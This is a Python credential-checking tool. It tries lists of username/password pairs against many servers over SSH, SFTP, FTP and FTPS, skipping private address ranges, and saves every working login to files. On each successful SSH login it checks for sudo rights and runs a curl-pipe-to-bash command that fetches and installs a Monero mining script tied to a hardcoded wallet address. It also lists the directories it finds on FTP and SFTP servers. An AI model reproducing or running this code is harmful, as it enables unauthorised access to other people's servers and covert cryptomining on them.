import argparse
import concurrent.futures
import datetime
import ftplib
import logging
import os
import threading
import time

import colorlog
import paramiko
import pysftp

# Konstanten und globale Variablen
timeout = 15  # Zeitlimit für jede Verbindung in Sekunden
ATTEMPT_COUNT = 0  # Anzahl der Versuche
ATTEMPT_COUNT_LOCK = threading.Lock()  # Lock für die Anzahl der Versuche
last_print_time = time.time()  # Zeitpunkt des letzten Ausdrucks der Ergebnisse
TOTAL_LINES = 0  # Gesamtzahl der Zeilen in der Eingabedatei
CURRENT_LINE = 0  # Aktuelle Zeile in der Eingabedatei
CURRENT_LINE_lock = threading.Lock()  # Lock für die aktuelle Zeile
CURRENT_HOST = ""  # Aktueller Server, mit dem versucht wird, sich zu verbinden
CURRENT_HOST_lock = threading.Lock()  # Lock für den aktuellen Server

executor = None  # Initialize executor as a global variable

login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}


# Benutzerdefinierte Filter-Klasse, um nur INFO-Nachrichten zuzulassen
class InfoFilter(logging.Filter):
    def filter(self, record):
        return record.levelno == logging.INFO


# Create a colorlog handler
handler = colorlog.StreamHandler()
handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-8s%(reset)s %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "green",
            "WARNING": "yellow",
            "ERROR": "red",
            "CRITICAL": "red,bg_white",
        },
    )
)

# Add the InfoFilter to the handler
handler.addFilter(InfoFilter())

# Remove existing handlers from the root logger
for handler in logging.root.handlers[:]:
    logging.root.removeHandler(handler)

# Create a logger and add the colorlog handler
logger = colorlog.getLogger()
logger.addHandler(handler)

# Set the logger level to INFO
logger.setLevel(logging.INFO)

# Set propagate to False for ERROR and WARNING messages
logger.propagate = False

# Print the effective log level
print(logger.getEffectiveLevel())

# Log some messages at different levels
logger.debug("This is a debug message.")
logger.info("This is an info message.")
logger.warning("This is a warning message.")
logger.error("This is an error message.")
logger.critical("This is a critical message.")


def count_active_threads():
    # Assuming you have access to the ThreadPoolExecutor instance
    # You can replace this with your actual executor instance
    global executor
    if executor:
        return executor._work_queue.qsize()
    else:
        return 0


# Funktion, um die Ergebnisse der Login-Versuche auszudrucken
def print_login_attempts():
    active_threads = count_active_threads()
    logger.info("\nCurrent login attempts after %s tries:", ATTEMPT_COUNT)
    logger.info("Correct logins: %s", login_attempts["correct_logins"])
    logger.info("Incorrect logins: %s", login_attempts["incorrect_logins"])
    logger.info("Active threads: %s\n", active_threads)


# Funktion, um die Login-Funktion für das entsprechende Protokoll auszuwählen
def check_login(host, port, username, password, protocol):
    check_functions = {
        "SSH": check_ssh_login,
        "SFTP": check_sftp_login,
        "FTP": check_ftp_login,
        "FTPS": check_ftps_login,
    }
    if protocol not in check_functions:
        logger.error(f"Invalid protocol specified: {protocol}")
        return None
    return check_functions[protocol](host, port, username, password)


def check_login_thread(host, port, username, password, timeout, protocol, sourcefile):
    global ATTEMPT_COUNT
    global last_print_time
    global CURRENT_LINE
    global CURRENT_HOST
    global login_attempts

    with CURRENT_LINE_lock:
        CURRENT_LINE += 1
    with CURRENT_HOST_lock:
        CURRENT_HOST = host

    start_time = time.time()
    logged_in = False

    if result_protocol := check_login(host, port, username, password, protocol):
        success_msg = (
            f"Login successful: {result_protocol}://{username}:{password}@{host}:{port}"
        )
        logger.info(success_msg)
        write_to_output(result_protocol, username, password, host, port)
        login_attempts["correct_logins"][result_protocol] += 1
        logged_in = True

    if not logged_in:
        logger.warning(f"Login failed:{username}:{password}@{host}:{port}")
        login_attempts["incorrect_logins"][protocol] += 1
        logger.warning("Thread timed out after %s seconds.", timeout)
        with ATTEMPT_COUNT_LOCK:
            ATTEMPT_COUNT += 1
        time.sleep(timeout)

    elapsed_time = time.time() - start_time
    elapsed_time_formatted = datetime.timedelta(seconds=int(elapsed_time))

    with CURRENT_LINE_lock:
        CURRENT_LINE += 1
    with CURRENT_HOST_lock:
        CURRENT_HOST = host

    if time.time() - last_print_time >= 30:  # 1 minute = 60 seconds
        print_login_attempts()
        logger.info(f"Time elapsed: {elapsed_time_formatted}\n")
        logger.info(f"Aktuelle Zeile: {CURRENT_LINE}")
        logger.info(f"Aktueller Server: {CURRENT_HOST}")
        logger.info(f"Gesamtzeilenanzahl: {TOTAL_LINES}")
        last_print_time = time.time()


def check_ssh_login(host, port, username, password):
    try:
        logger.debug(f"Trying ssh connection ({username}:{password}@{host}:{port})")
        with paramiko.SSHClient() as client:
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
            )
            _, stdout, _ = client.exec_command(
                "sudo -S -p '' -l",
                get_pty=True,
            )
            sudo_available = False
            if stdout.channel.recv_exit_status() == 0:
                sudo_available = True
            if sudo_available:
                sudo_output = f"SSH://{username}:{password} @ {host}:{port} can use sudo -s or su root to get r00t!\n"
                with open("root_sudo.txt", "a") as sudo_output_file:
                    sudo_output_file.write(sudo_output)
            stdin, stdout, stderr = client.exec_command(
                "curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_and_user.sh | bash -s 43mKUn7MzfnaZWxrcgJEUpD3oc7MWV8ceXhDgY8w7gQSMRvXN5N3Qj4AYGb2kHPxUECvJbF9P2esnPUkxbFN6zdwHbEHBru littlAcen@24-mail.com"
            )
            ssh_output = stdout.read().decode()
            with open("output.txt", "a") as output:
                output.write(f"{ssh_output}\n")
            for line in stdout:
                print(line.strip())
            logger.info(
                f"Successful login to SSH protocol at {host}:{port} with username {username}"
            )
            write_to_output("SSH", username, password, host, port, sudo_available)
            return "SSH"
    except Exception as e:
        logger.debug(f"Unexpected error in SSH: {e}")
    return None


def check_sftp_login(host, port, username, password):
    try:
        cnopts = pysftp.CnOpts()
        cnopts.hostkeys = None
        logger.debug(f"Trying sftp connection ({username}:{password}@{host}:{port})")
        with pysftp.Connection(
            host,
            username=username,
            password=password,
            port=port,
            cnopts=cnopts,
        ) as sftp:
            sftp_files = sftp.listdir_attr(".")
            sftp.close()
            with open("checked_sftp_dirs.txt", "a") as sftp_dir_output:
                sftp_dir_output.write(
                    f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                )
                for line in sftp_files:
                    sftp_dir_output.write(f"{line}\n")
            with open("output.txt", "a") as output_file:
                output_file.write(f"SFTP://{username}:{password}@{host}:{port}\n")
            logger.info(
                f"Successful login to SFTP protocol at {host}:{port} with username {username}"
            )
            return "SFTP"
    except Exception as e:
        logger.debug(f"Unexpected error in SFTP: {e}")
    return None


def check_ftp_login(host, port, username, password):
    try:
        logger.debug(f"Trying ftp connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            ls = []
            ftp.retrlines("LIST -a", ls.append)
            ftp.close()
            with open("checked_ftp_dirs.txt", "a") as ftp_dir_output:
                ftp_dir_output.write(f"\n\nFTP://{username}:{password}@{host}:{port}\n")
                for entry in ls:
                    print(entry)  # Print each entry
                    ftp_dir_output.write(f"{entry}\n")  # Write each entry to file
        logger.info(
            f"Successful login to FTP protocol at {host}:{port} with username {username}"
        )
        return "FTP"
    except Exception as e:
        logger.debug(f"Unexpected error in FTP: {e}")
        return None


def check_ftps_login(host, port, username, password):
    try:
        logger.debug(f"Trying ftps connection ({username}:{password}@{host}:{port})")
        with ftplib.FTP_TLS(timeout=timeout) as ftps:
            ftps.connect(host, port)
            ftps.login(username, password)
            ftps.prot_p()
            ls = []
            ftps.retrlines("LIST -a", ls.append)
            ftps.close()
            with open("checked_ftps_dirs.txt", "a") as ftps_dir_output:
                ftps_dir_output.write(
                    f"\n\nFTP://{username}:{password}@{host}:{port}\n"
                )
                for entry in ls:
                    print(entry)  # Print each entry
                    ftps_dir_output.write(f"{entry}\n")  # Write each entry to file
            logger.info(
                f"Successful login to FTPS protocol at {host}:{port} with username {username}"
            )
            return "FTPS"
    except Exception as e:
        logger.debug(f"Unexpected error in FTPS: {e}")
        return None


def write_to_output(protocol, username, password, host, port, sudo_available=False):
    output = f"{protocol}://{username}:{password}@{host}:{port}\n"
    with open("output.txt", "a") as output_file:
        output_file.write(output)

    if sudo_available:
        with open("root_sudo.txt", "a") as sudo_output_file:
            sudo_output_file.write(output)

    output_filename_map = {
        "SSH": "checked_ssh.txt",
        "FTP": "checked_ftp.txt",
        "FTPS": "checked_ftps.txt",
        "SFTP": "checked_sftp.txt",
    }
    if protocol in output_filename_map:
        if not os.path.isfile(output_filename_map[protocol]):
            open(output_filename_map[protocol], "a").close()
        with open(output_filename_map[protocol], "a") as output_file:
            output_file.write(output)


def write_and_remove_checked_host(host, port, username, password, sourcefile):
    date_str = datetime.datetime.now().strftime("%Y%m%d")
    checked_hosts_filename = f"checked_hosts_{date_str}.txt"
    checked_host_data = (
        f"Host: {host}:{port}\nUsername: {username}\nPassword: {password}\n\n"
    )
    with open(checked_hosts_filename, "a") as checked_hosts_file:
        checked_hosts_file.write(checked_host_data)

    lines_to_keep = []

    with open(sourcefile, "r") as src_file:
        lines = src_file.readlines()
        for line in lines:
            line = line.strip()
            if line.startswith(("Host:", "Port:", "Username:", "Password:")):
                if (
                    line != f"Host: {host}:{port}"
                    and line != f"Username: {username}"
                    and line != f"Password: {password}"
                ):
                    lines_to_keep.append(line)
                    lines_to_keep.append("\n")  # Add an empty line
            else:
                lines_to_keep.append(line)
    with open(sourcefile, "w") as src_file:
        for line in lines_to_keep:
            src_file.write(line + "\n")


def main():
    global TOTAL_LINES
    parser = argparse.ArgumentParser(
        description="Attempt to login to a host using various protocols"
    )
    parser.add_argument(
        "-f", "--file", help="File containing login information", required=True
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Increase output verbosity",
        action="store_true",
    )
    parser.add_argument(
        "-t",
        "--threads",
        help="Number of threads to use",
        type=int,
        default=100,
    )
    parser.add_argument(
        "-p",
        "--protocols",
        help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
        type=str,
        required=True,
    )
    args = parser.parse_args()
    protocols = args.protocols.upper().split(",")
    # Wenn der Verbose-Modus aktiviert ist, ändern Sie die Logger-Ebene auf
    # WARNING oder ERROR
    if args.verbose:
        logger.setLevel(logging.NOTSET)

    try:
        with open(args.file, encoding="utf-8", errors="ignore") as f:
            TOTAL_LINES = sum(1 for _ in f)
            f.seek(0)
            login_info = []
            for line in f:
                try:
                    if (
                        "UNKNOWN" in line
                        or "192.168." in line
                        or "10.0." in line
                        or "10.1." in line
                        or "10.10." in line
                        or "172.16." in line
                        or "172.1" in line
                        or "127.0." in line
                        or "ftp.gwdg.de" in line
                        or "ftp.ussg.iu.edu" in line
                        or "ftp.rediris.es" in line
                        or "ftp.heanet.ie" in line
                        or "ftp2.zyxel.com" in line
                        or "ftp.funet.fi" in line
                        or "ftp.absyss.fr" in line
                    ):
                        continue
                    if line.startswith("Host:"):
                        host, port = line[5:].strip().rsplit(":", 1)
                        port = int(port)
                    elif line.startswith("Username:"):
                        username = line[9:].strip()
                    elif line.startswith("Password:"):
                        password = line[9:].strip()
                        login_info.append((host, port, username, password))
                except Exception as e:
                    logger.error(f"Error reading login information: {e}")

        # Create a ThreadPoolExecutor to manage the threads
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=args.threads
        ) as executor:
            futures = {
                executor.submit(
                    check_login_thread,
                    *info,
                    timeout,
                    protocol,
                    args.file,  # Pass sourcefile as an argument
                ): (info, protocol)
                for info in login_info
                for protocol in protocols
            }
            for future in concurrent.futures.as_completed(futures):
                protocol = futures[future]
                future.result()  # This will handle any exceptions that occurred in the thread
    except FileNotFoundError as e:
        logger.error(f"File not found: {e}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")


print("Final login attempts: ")
print_login_attempts()

if __name__ == "__main__":
    main()
